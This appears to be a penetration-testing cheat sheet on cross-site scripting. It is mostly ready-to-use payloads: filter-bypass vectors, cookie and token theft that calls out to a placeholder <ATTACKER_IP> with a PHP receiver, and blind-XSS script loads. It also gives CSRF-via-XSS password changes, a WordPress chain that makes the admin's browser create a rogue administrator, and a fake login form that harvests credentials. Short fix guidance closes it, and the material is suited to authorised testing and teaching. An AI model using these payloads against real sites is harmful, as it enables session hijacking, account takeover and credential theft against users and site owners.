# Cross-Site Scripting (XSS)

Cross-site scripting injects JavaScript that runs in another user's browser. It can steal sessions, key actions, deface pages, and lead to account takeover. Test for it after mapping inputs during [Web Enumeration](web-enumeration.md).

{% hint style="warning" %}
`alert(1)` proves the bug exists. It does **not** prove impact. For the report, always escalate to session theft, an admin action performed as the victim, or credential capture. See [Prove impact](#prove-impact-dont-just-alert1).
{% endhint %}

## The three types

| Type | Where the payload lives | Impact |
| --- | --- | --- |
| **Reflected** | Echoed straight back in the response (search boxes, error messages, URL params) | Needs a delivered link; fires once |
| **Stored** | Saved server-side and served to everyone (comments, profiles, logs) | Highest — hits every viewer, including admins |
| **DOM-based** | Client-side JS writes your input into a sink; server never sees it | Fires from the fragment (`#`), invisible to server logs |

## Core payloads

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(document.cookie)>
<input onfocus=alert(1) autofocus>
<body onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
"><script>alert(1)</script>       <!-- break out of an attribute -->
javascript:alert(1)               <!-- href / src context -->
```

### Reflected — test in the URL

```
http://victim.com/search?q=<script>alert(1)</script>
http://victim.com/page?error=<img src=x onerror=alert(1)>
http://victim.com/comment?text=<svg onload=alert(1)>
```

### DOM-based — find the sink, fire from the fragment

```javascript
// Vulnerable client-side code
var param = document.location.hash.substring(1);
document.getElementById('output').innerHTML = param;   // sink: innerHTML
```

```
http://victim.com/page#<img src=x onerror=alert(1)>
```

**Dangerous sinks to grep for in JS:** `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `setInterval(str)`, `location`, `document.location`, `window.open`.
**Safe alternatives** (rule these out): `textContent`, `innerText`.

## Context matters — match the payload to where you land

```html
<!-- HTML body -->        <script>alert(1)</script>
<!-- HTML attribute -->   "><svg onload=alert(1)>
<!-- Inside a tag attr --> " onmouseover=alert(1) x="
<!-- href / src -->       javascript:alert(1)
<!-- inside <script> -->  ';alert(1);//
<!-- event handlers -->   onmouseover / onclick / onload / onchange / onstart
```

## Filter bypass

```html
<!-- case -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- no parens -->
<img src=x onerror=alert`1`>

<!-- no spaces -->
<svg/onload=alert(1)>

<!-- encoding -->
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
<img src=x onerror="alert('\x41')">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- broken/duplicated keywords (defeats naive blacklists) -->
<img src=x oner/**/ror=alert(1)>
<img src=x onerror=alert(1) onload=alert(1)>

<!-- eval alternatives -->
<img src=x onerror="Function('alert(1)')()">
<img src=x onerror="setTimeout('alert(1)',0)">

<!-- SVG / XML vectors -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject>
```

## Weaponize — steal the session

```html
<script>fetch('http://<ATTACKER_IP>/c?='+document.cookie)</script>
<script>new Image().src='http://<ATTACKER_IP>/?'+document.cookie</script>
<script>document.location='http://<ATTACKER_IP>/grab?c='+document.cookie</script>
```

Catch it with a listener — the cookie lands in the access log:

```bash
python3 -m http.server 80
```

If the cookie has `HttpOnly` you can't read it. Pivot to what JS *can* reach:

```javascript
fetch('http://<ATTACKER_IP>/?t=' + localStorage.getItem('auth_token'));
fetch('http://<ATTACKER_IP>/?ua=' + navigator.userAgent);
```

### Cookie receiver + reuse

```php
<?php // receiver.php — log every cookie with the victim IP
if (isset($_GET['c'])) {
    $f = fopen("cookies.txt", "a+");
    fputs($f, "IP {$_SERVER['REMOTE_ADDR']} | {$_GET['c']}\n");
    fclose($f);
}
```

Reuse the stolen cookie: target site → DevTools → Application → Cookies → set `PHPSESSID=<stolen>` → refresh. You're now the victim.

## Blind XSS — fires where you can't see it

Payload executes in a context you never load: admin panels, support tickets, log viewers. Confirm with an external callback.

```html
<script src=http://<ATTACKER_IP>/xss.js></script>
'><script src=http://<ATTACKER_IP>/xss.js></script>
"><script src=http://<ATTACKER_IP>/xss.js></script>
```

**Where to inject:** contact forms, support tickets, profile fields, and request headers rendered in admin dashboards.

### Stored XSS via HTTP headers

When an app logs request metadata (analytics, visitor plugins, WAFs) and renders it into an admin view unsanitized, put the payload in the *header*, not the body:

```bash
curl -i http://<TARGET>/ --user-agent "<script>alert(1)</script>"
curl -i http://<TARGET>/ -e "http://x/'\"><script>alert(1)</script>"      # Referer
curl -i http://<TARGET>/ -H "X-Forwarded-For: <script>alert(1)</script>"
```

**When to use:** an admin login exists AND the app has a "visitor log" / "recent hits" table.

## CSRF via XSS — act as the victim

XSS runs in the victim's session, so it defeats CSRF tokens automatically: it can read the token, then submit.

```html
<script>
fetch('/admin/promote?user=attacker&role=admin');   // GET action
</script>
<script>                                             // POST action
var x=new XMLHttpRequest();
x.open('POST','/admin/changepass',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.send('newpass=hacked123&confirm=hacked123');
</script>
```

## XSS to new CMS admin (full priv-esc chain)

The classic stored-XSS-in-visitor-log escalation: make the admin's own browser create a new admin account for you. Works on any nonce-protected CMS (WordPress, Joomla); swap the nonce regex and form fields.

```javascript
// Step 1 — grab the live nonce from the admin's session (sync request)
var r = new XMLHttpRequest();
r.open("GET", "/wp-admin/user-new.php", false); r.send();
var nonce = /ser" value="([^"]*?)"/g.exec(r.responseText)[1];

// Step 2 — POST the new-admin form
var p = "action=createuser&_wpnonce_create-user=" + nonce +
        "&user_login=attacker&email=a@a.com&pass1=Attacker123&pass2=Attacker123&role=administrator";
var r2 = new XMLHttpRequest();
r2.open("POST", "/wp-admin/user-new.php", true);
r2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
r2.send(p);
```

To survive quote/space mangling, encode the whole payload with `String.fromCharCode(...)` and deliver via `eval(String.fromCharCode(...))` inside a `<script>` in the User-Agent. When the admin loads the log page, you get `attacker:Attacker123`.

## Defacing + phishing (visual impact for the report)

```javascript
document.body.style.background="#141d2b";
document.title="Owned";
document.body.innerHTML="<h1>XSS</h1>";
```

Fake login to harvest credentials:

```javascript
document.body.innerHTML =
 '<h3>Session expired, please log in:</h3>' +
 '<form action="http://<ATTACKER_IP>/phish.php">' +
 '<input name=user placeholder=Username>' +
 '<input name=pass type=password placeholder=Password>' +
 '<input type=submit value=Login></form>';
```

## Testing workflow

```bash
# 1. Map every input (params, forms, headers, JSON fields) — see Web Enumeration
# 2. Fire a canary in each: xss<random>  → search the response for it un-encoded
# 3. Where it reflects, escalate to the context-matched payload above
# 4. Confirm execution in a real browser, not just curl
burpsuite      # intercept, repeat, fuzz
nuclei         # template-based XSS scan
```

## Prove impact, don't just `alert(1)`

For the [report](report-writing.md), show the real consequence: session theft, an admin action performed as the victim, credential capture on a fake form, or the CMS-admin chain above. `alert(1)` proves the bug; the impact proves the finding, and drives the severity rating.

## Fix guidance (for the remediation section)

* **Output-encode** on the way out, per context (HTML, attribute, JS, URL). Encoding is the primary defense.
* **Content-Security-Policy**: `script-src 'self'` blocks inline and injected scripts.
* **`HttpOnly` + `Secure`** on session cookies so XSS can't read them.
* **Framework auto-escaping** (React JSX, Angular, Vue); never bypass with `dangerouslySetInnerHTML` / `v-html` on user input.

## Related

* [Web Enumeration](web-enumeration.md) — find the inputs first
* [HTTP Attacks](http-attacks.md) · [SQL Injection](sql-injection.md) · [Command Injection](command-injection.md)
* [Server-Side Attacks](server-side-attacks.md) — when input hits the server instead
* [Report Writing](report-writing.md) — turning a finding into a rated report entry
